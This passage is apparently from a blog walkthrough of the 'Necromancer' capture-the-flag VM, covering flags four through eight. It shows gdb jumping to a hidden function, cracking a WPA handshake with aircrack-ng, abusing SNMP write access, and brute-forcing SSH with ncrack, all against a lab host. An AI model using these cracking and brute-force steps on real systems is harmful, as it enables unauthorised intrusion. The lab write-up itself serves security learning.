0x0804894c &lt;+1059&gt;:	mov    BYTE PTR [ebp-0x80],0xbf</span><br><span class="line">   0x08048950 &lt;+1063&gt;:	mov    BYTE PTR [ebp-0x7f],0xbc</span><br><span class="line">   0x08048954 &lt;+1067&gt;:	mov    BYTE PTR [ebp-0x7e],0x53</span><br><span class="line">   0x08048958 &lt;+1071&gt;:	mov    BYTE PTR [ebp-0x7d],0xd5</span><br><span class="line">   0x0804895c &lt;+1075&gt;:	mov    BYTE PTR [ebp-0x7c],0xdd</span><br><span class="line">   0x08048960 &lt;+1079&gt;:	mov    BYTE PTR [ebp-0x7b],0x9b</span><br><span class="line">   0x08048964 &lt;+1083&gt;:	mov    BYTE PTR [ebp-0x7a],0x52</span><br><span class="line">   0x08048968 &lt;+1087&gt;:	mov    BYTE PTR [ebp-0x79],0xc6</span><br><span class="line">   0x0804896c &lt;+1091&gt;:	mov    BYTE PTR [ebp-0x78],0x95</span><br><span class="line">   0x08048970 &lt;+1095&gt;:	mov    BYTE PTR [ebp-0x77],0x9a</span><br><span class="line">   0x08048974 &lt;+1099&gt;:	mov    BYTE PTR [ebp-0x76],0x5d</span><br><span class="line">   0x08048978 &lt;+1103&gt;:	mov    BYTE PTR [ebp-0x75],0xd1</span><br><span class="line">   0x0804897c &lt;+1107&gt;:	mov    BYTE PTR [ebp-0x74],0xc5</span><br><span class="line">   0x08048980 &lt;+1111&gt;:	mov    BYTE PTR [ebp-0x73],0x97</span><br><span class="line">   0x08048984 &lt;+1115&gt;:	mov    BYTE PTR [ebp-0x72],0x52</span><br><span class="line">   0x08048988 &lt;+1119&gt;:	mov    BYTE PTR [ebp-0x71],0xd2</span><br><span class="line">   0x0804898c &lt;+1123&gt;:	mov    BYTE PTR [ebp-0x70],0x9b</span><br><span class="line">   0x08048990 &lt;+1127&gt;:	mov    BYTE PTR [ebp-0x6f],0xf8</span><br><span class="line">   0x08048994 &lt;+1131&gt;:	mov    BYTE PTR [ebp-0x6e],0x36</span><br><span class="line">   0x08048998 &lt;+1135&gt;:	mov    BYTE PTR [ebp-0x6d],0xab</span><br><span class="line">   0x0804899c &lt;+1139&gt;:	mov    BYTE PTR [ebp-0x6c],0xbf</span><br><span class="line">   0x080489a0 &lt;+1143&gt;:	mov    BYTE PTR [ebp-0x6b],0xf2</span><br><span class="line">   0x080489a4 &lt;+1147&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489a7 &lt;+1150&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489ad &lt;+1156&gt;:	push   eax</span><br><span class="line">   0x080489ae &lt;+1157&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489b3 &lt;+1162&gt;:	add    esp,0x10</span><br><span class="line">   0x080489b6 &lt;+1165&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489b9 &lt;+1168&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489bf &lt;+1174&gt;:	add    eax,0x64</span><br><span class="line">   0x080489c2 &lt;+1177&gt;:	push   eax</span><br><span class="line">   0x080489c3 &lt;+1178&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489c8 &lt;+1183&gt;:	add    esp,0x10</span><br><span class="line">   0x080489cb &lt;+1186&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489ce &lt;+1189&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489d4 &lt;+1195&gt;:	add    eax,0xc8</span><br><span class="line">   0x080489d9 &lt;+1200&gt;:	push   eax</span><br><span class="line">   0x080489da &lt;+1201&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489df &lt;+1206&gt;:	add    esp,0x10</span><br><span class="line">   0x080489e2 &lt;+1209&gt;:	sub    esp,0x8</span><br><span class="line">   0x080489e5 &lt;+1212&gt;:	lea    eax,[ebp-0x1c]</span><br><span class="line">   0x080489e8 &lt;+1215&gt;:	push   eax</span><br><span class="line">   0x080489e9 &lt;+1216&gt;:	push   0x80495b0</span><br><span class="line">   0x080489ee &lt;+1221&gt;:	call   0x8048330 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080489f3 &lt;+1226&gt;:	add    esp,0x10</span><br><span class="line">   0x080489f6 &lt;+1229&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489f9 &lt;+1232&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489ff &lt;+1238&gt;:	add    eax,0x12c</span><br><span class="line">   0x08048a04 &lt;+1243&gt;:	push   eax</span><br><span class="line">   0x08048a05 &lt;+1244&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x08048a0a &lt;+1249&gt;:	add    esp,0x10</span><br><span class="line">   0x08048a0d &lt;+1252&gt;:	nop</span><br><span class="line">   0x08048a0e &lt;+1253&gt;:	mov    edi,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048a11 &lt;+1256&gt;:	leave  </span><br><span class="line">   0x08048a12 &lt;+1257&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x080482d0  _init</span><br><span class="line">0x08048310  printf@plt</span><br><span class="line">0x08048320  __libc_start_main@plt</span><br><span class="line">0x08048330  __isoc99_scanf@plt</span><br><span class="line">0x08048350  _start</span><br><span class="line">0x08048380  __x86.get_pc_thunk.bx</span><br><span class="line">0x08048390  deregister_tm_clones</span><br><span class="line">0x080483c0  register_tm_clones</span><br><span class="line">0x08048400  __do_global_dtors_aux</span><br><span class="line">0x08048420  frame_dummy</span><br><span class="line">0x0804844b  unhide</span><br><span class="line">0x0804849d  hide</span><br><span class="line">0x080484f4  myPrintf</span><br><span class="line">0x08048529  wearTalisman</span><br><span class="line">0x08048a13  main</span><br><span class="line">0x08048a37  chantToBreakSpell</span><br><span class="line">0x08049530  __libc_csu_init</span><br><span class="line">0x08049590  __libc_csu_fini</span><br><span class="line">0x08049594  _fini</span><br><span class="line"></span><br><span class="line">(gdb) break main</span><br><span class="line">Breakpoint 1 at 0x8048a21</span><br><span class="line"></span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /root/ctf/necromancer/talisman</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048a21 in main ()</span><br><span class="line">(gdb) jump chantToBreakSpell</span><br><span class="line">Continuing at 0x8048a3b.</span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">You fall to your knees.. weak and weary.</span><br><span class="line">Looking up you can see the spell is still protecting the cave entrance.</span><br><span class="line">The talisman is now almost too hot to touch!</span><br><span class="line">Turning it over you see words now etched into the surface:</span><br><span class="line">flag4&#123;ea50536158db50247e110a6c89fcf3d3&#125;</span><br><span class="line">Chant these words at u31337</span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[Inferior 1 (process 10645) exited with code 0162]</span><br></pre></td></tr></table></figure>
<p>If you are wondering what happened here let me tell you. I disassmbled the binary’s main function, which calls <code>wearTalisman</code> which is where the text we say earlier is printed (apparently gdb does not recognize this as a string which blows up the size of the function) but otherwise it does nothing interesting. <code>info functions</code> however revealed that there is a function called <code>chantToBreakSpell</code> which is neither called in <code>main</code> nor in <code>wearTalisman</code>, so I called it myself by breaking at the start of the program and consequently jumping to said function.</p>
<h3 id="5th-Flag-Throwback-time"><a href="#5th-Flag-Throwback-time" class="headerlink" title="5th Flag: Throwback time"></a>5th Flag: Throwback time</h3><p>The last flag came with sufficient instructions; we have to communicate with UDP port 31337 (aparently the Necromancer is fluent in leetspeak).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 31337 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 21:17 CET</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31337/udp open  BackOrifice</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds</span><br></pre></td></tr></table></figure>
<p>As expected the port is open and a service named BackOrifice sits behind it. I recognize the name from the early-mid 2000s, when me and a friend of mine used to experiment with it on LAN parties (without success due to seriously limited knowledge at that time). It’s an oldschool backdoor trojan. In this case I don’t expect it to be the real BackOrifice, since I only recall it running on Windows, not on BSD, the necromancer’s operating system of choice. Enough talk, let’s chant the words:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nc -u 10.0.2.10 31337</span><br><span class="line">ea50536158db50247e110a6c89fcf3d3Nothing happens.</span><br><span class="line">flag4&#123;ea50536158db50247e110a6c89fcf3d3&#125;Nothing happens.</span><br></pre></td></tr></table></figure>
<p>The only answer is <code>Nothing happens</code>, we don’t even get a newline. Like before on flag 2, I try the hash cracker again and receive the word <code>blackmagic</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# echo blackmagic | nc -u 10.0.2.10 31337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">As you chant the words, a hissing sound echoes from the ice walls.</span><br><span class="line"></span><br><span class="line">The blue aura disappears from the cave entrance.</span><br><span class="line"></span><br><span class="line">You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.</span><br><span class="line"></span><br><span class="line">You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.</span><br><span class="line"></span><br><span class="line">The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.</span><br><span class="line"></span><br><span class="line">Suddenly, you are attacked by a swarm of bats!</span><br><span class="line"></span><br><span class="line">You aimlessly thrash at the air in front of you!</span><br><span class="line"></span><br><span class="line">The bats continue their relentless attack, until.... silence.</span><br><span class="line"></span><br><span class="line">Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.</span><br><span class="line"></span><br><span class="line">Looking towards one of the torches, you see something on the cave wall.</span><br><span class="line"></span><br><span class="line">You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.</span><br><span class="line"></span><br><span class="line">/thenecromancerwillabsorbyoursoul</span><br><span class="line"></span><br><span class="line">flag5&#123;0766c36577af58e15545f099a3b15e60&#125;</span><br></pre></td></tr></table></figure>
<p>Same solution as last time.</p>
<h3 id="6th-Flag-Resulting-to-brute-force"><a href="#6th-Flag-Resulting-to-brute-force" class="headerlink" title="6th Flag: Resulting to brute force"></a>6th Flag: Resulting to brute force</h3><p>What awaits us at <code>http://10.0.2.10/thenecromancerwillabsorbyoursoul</code> is too long for a screenshot, but see for yourself:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> flag6&#123;b1c3ed8f1db4258e4dcb0ce565f6dc03&#125;</span><br><span class="line">You continue to make your way through the cave.</span><br><span class="line">In the distance you can see a familiar flicker of light moving in and out of the shadows.</span><br><span class="line">As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.</span><br><span class="line">You move closer, and then stop frozen with fear.</span><br><span class="line">It&apos;s the necromancer!</span><br></pre></td></tr></table></figure>
<img src="/2017/12/17/necromancer/necromancer.jpg" title="The Necromancer">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Again he stares at you with deathly hollow eyes.</span><br><span class="line">He is standing in a doorway; a staff in one hand, and an object in the other.</span><br><span class="line">Smirking, the necromancer holds the staff and the object in the air.</span><br><span class="line">He points his staff in your direction, and the stench of death and decay begins to fill the air.</span><br><span class="line">You stare into his eyes and then.......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.</span><br><span class="line">The amulet must have saved you from whatever spell the necromancer had cast.</span><br><span class="line">You stand to your feet. Behind you, only darkness.</span><br><span class="line">Before you, a large door with the symbol of a skull engraved into the surface.</span><br><span class="line">Looking closer at the skull, you can see u161 engraved into the forehead.</span><br></pre></td></tr></table></figure>
<h3 id="7th-Flag-Ancient-services"><a href="#7th-Flag-Ancient-services" class="headerlink" title="7th Flag: Ancient services"></a>7th Flag: Ancient services</h3><p>Spooky, but it seems we survived the encounter. In addition to the hint to UDP port 161 the necromancer links to the download of a binary file.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# file necromancer</span><br><span class="line">necromancer: bzip2 compressed data, block size = 900k</span><br><span class="line">root@kali:~/ctf/necromancer# mv necromancer necromancer.bz2</span><br><span class="line">root@kali:~/ctf/necromancer# bzip2 -d necromancer.bz2</span><br><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">necromancer</span><br><span class="line">root@kali:~/ctf/necromancer# file necromancer</span><br><span class="line">necromancer: POSIX tar archive (GNU)</span><br><span class="line">root@kali:~/ctf/necromancer# mv necromancer necromancer.tar</span><br><span class="line">root@kali:~/ctf/necromancer# tar xvf necromancer.tar</span><br><span class="line">necromancer.cap</span><br></pre></td></tr></table></figure>
<p>It’s a packet capture file which we can open with wireshark:</p>
<img src="/2017/12/17/necromancer/pcap.png" title="Packet Capture">
<p>It looks like wireless lan traffic and probably includes a handshake. Maybe we can extract (i.e. crack) the password and use it on the open UDP port.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">Opening necromancer.cap</span><br><span class="line">Read 2197 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening necromancer.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line"></span><br><span class="line">      [00:00:06] 16128/9822768 keys tested (2439.42 k/s)</span><br><span class="line"></span><br><span class="line">      Time left: 1 hour, 7 minutes, 0 seconds                    0.16%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ death2all ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC</span><br><span class="line">                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7</span><br><span class="line"></span><br><span class="line">      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C</span><br><span class="line">                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3</span><br><span class="line">                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92</span><br><span class="line">                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D</span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E</span><br></pre></td></tr></table></figure>
<p>Using the biggest password list on Kali we were able to crack the password <code>death2all</code>. Now we can focus on the port.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 161 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 22:54 CET</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds</span><br></pre></td></tr></table></figure>
<p>The service we find is SNMP. A little bit of research reveals that it is the Simple Network Management Protocol, often used by routers or switches. I also found out that Kali comes with a related software to extract information from such a service called <code>snmpwalk</code> (which was a little bit tricky to understand):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# man snmpwalk</span><br><span class="line">root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: &quot;You stand in front of a door.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: &quot;The door is Locked. If you choose to defeat me, the door must be Unlocked.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: &quot;Fear the Necromancer!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;Locked - death2allrw!&quot;</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
<p>So it’s not that easy. At this point I almost gave up, as I did not understand SNMP well enough, but I guess it’s sometimes necessary to dive deep into ancient protocols.</p>
<p>I guess the <code>snmp</code> equivalent of unlocking a door is setting the value of the “Locked…” string to something else. A specific value is probably needed so I read the <code>snmpwalk</code> output again and notice the unusual capitalization of “Unlocked”, which also happens to be a plausible value for the string.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# snmpset -c death2all -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string &quot;Unlocked&quot;</span><br><span class="line">Error in packet.</span><br><span class="line">Reason: (noSuchName) There is no such variable name in this MIB.</span><br><span class="line">Failed object: iso.3.6.1.2.1.1.6.0</span><br></pre></td></tr></table></figure>
<p>We probably do not have write access and by revisiting the previous output it is painfully obvious that the Necromancer has provided us with a community string that grants probably grants us this access (given that the <code>rw</code> in <code>death2allrw</code> stands for <code>read/write</code>). Let’s try again:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# snmpset -c death2allrw -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string &quot;Unlocked&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;Unlocked&quot;</span><br><span class="line">root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: &quot;You stand in front of a door.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: &quot;The door is unlocked! You may now enter the Necromancer&apos;s lair!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: &quot;Fear the Necromancer!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;flag7&#123;9e5494108d10bbd5f9e7ae52239546c4&#125; - t22&quot;</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
<h3 id="8th-Flag-Mounting-the-offensive"><a href="#8th-Flag-Mounting-the-offensive" class="headerlink" title="8th Flag: Mounting the offensive"></a>8th Flag: Mounting the offensive</h3><p>It worked! The answer points to <code>tcp/22</code> (SSH) which looks like we are about to get shell access on the Necromancer machine. However, we need a username and password first and there is not hint other than the port and the flag. We can try to milk the flag again by reversing the <code>md5</code> hash online again, a recurring theme of the Necromancer’s flags. Doing so revealed that <code>demonslayer</code> was behind the hash. This does not look like a username/password combination, though. We can still try to use it as a username and crack the password. We use <code>hydra</code> for this, which would also allow us to use <code>demonslayer</code> as a password and brute force the user if the first approach does not work.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ncrack -p 22 --user demonslayer -P /usr/share/wordlists/rockyou.txt 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-04-01 13:51 CEST</span><br><span class="line">Stats: 0:00:14 elapsed; 0 services completed (1 total)</span><br><span class="line">Rate: 43.67; Found: 1; About 0.00% done</span><br><span class="line">(press &apos;p&apos; to list discovered credentials)</span><br><span class="line">Discovered credentials for ssh on 10.0.2.10 22/tcp:</span><br><span class="line">10.0.2.10 22/tcp ssh: &apos;demonslayer&apos; &apos;12345678&apos;</span><br></pre></td></tr></table></figure>
<p>Almost instantly the password is discovered to be <code>12345678</code>, which we probably also would have been able to guess without <code>ncrack</code>. This password drops us right into demonslayer’s korn shell (<code>ksh</code>) after an impressive MOTD:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ssh demonslayer@10.0.2.10</span><br><span class="line">The authenticity of host &apos;10.0.2.10 (10.0.2.10)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.0.2.10&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">demonslayer@10.0.2.10&apos;s password:</span><br><span class="line"></span><br><span class="line">          .                                                      .</span><br><span class="line">        .n                   .                 .                  n.</span><br><span class="line">  .   .dP                  dP                   9b                 9b.    .</span><br><span class="line"> 4    qXb         .       dX                     Xb       .        dXp     t</span><br><span class="line">dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb</span><br><span class="line">9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP</span><br><span class="line"> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP</span><br><span class="line">  `9XXXXXXXXXXXXXXXXXXXXX&apos;~   ~`OOO8b   d8OOO&apos;~   ~`XXXXXXXXXXXXXXXXXXXXXP&apos;</span><br><span class="line">    `9XXXXXXXXXXXP&apos; `9XX&apos;          `98v8P&apos;          `XXP&apos; `9XXXXXXXXXXXP&apos;</span><br><span class="line">        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~</span><br><span class="line">                        )b.  .dbo.dP&apos;`v&apos;`9b.odb.  .dX(</span><br><span class="line">                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.</span><br><span class="line">                     dXXXXXXXXXXXP&apos;   .   `9XXXXXXXXXXXb</span><br><span class="line">                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb</span><br><span class="line">                    9XXb&apos;   `XXXXXb.dX|Xb.dXXXXX&apos;   `dXXP</span><br><span class="line">                     `&apos;      9XXXXXX(   )XXXXXXP      `&apos;</span><br><span class="line">                              XXXX X.`v&apos;.X XXXX</span><br><span class="line">                              XP^X&apos;`b   d&apos;`X^XX</span><br><span class="line">                              X. 9  `   &apos;  P )X</span><br><span class="line">                              `b  `       &apos;  d&apos;</span><br><span class="line">                               `             &apos;                       </span><br><span class="line">                               THE NECROMANCER!</span><br><span class="line">                                 by  @xerubus</span><br><span class="line"></span><br><span class="line">$ echo $0</span><br><span class="line">-ksh</span><br><span class="line">$ ls</span><br><span class="line">flag8.txt</span><br><span class="line">$ cat flag8.txt</span><br><span class="line">You enter the Necromancer&apos;s Lair!</span><br><span class="line"></span><br><span class="line">A stench of decay fills this place.</span><br><span class="line"></span><br><span class="line">Jars filled with parts of creatures litter the bookshelves.</span><br><span class="line"></span><br><span class="line">A fire with flames of green burns coldly in the distance.</span><br><span class="line"></span><br><span class="line">Standing in the middle of the room with his back to you is the Necromancer.</span><br><span class="line"></span><br><span class="line">In front of him lies a corpse, indistinguishable from any living creature you have seen before.</span><br><span class="line"></span><br><span class="line">He holds a staff in one hand, and the flickering object in the other.</span><br><span class="line"></span><br><span class="line">&quot;You are a fool to follow me here!  Do you not know who I am!&quot;</span><br><span class="line"></span><br><span class="line">The necromancer turns to face you.  Dark words fill the air!</span><br><span class="line"></span><br><span class="line">&quot;You are damned already my friend.  Now prepare for your own death!&quot;</span><br><span class="line"></span><br><span class="line">Defend yourself!  Counter attack the Necromancer&apos;s spells at u777!</span><br></pre></td></tr></table></figure>
<p>Well, just when I thought we were on the offensive we are forced to parry. We log out and check:</p>
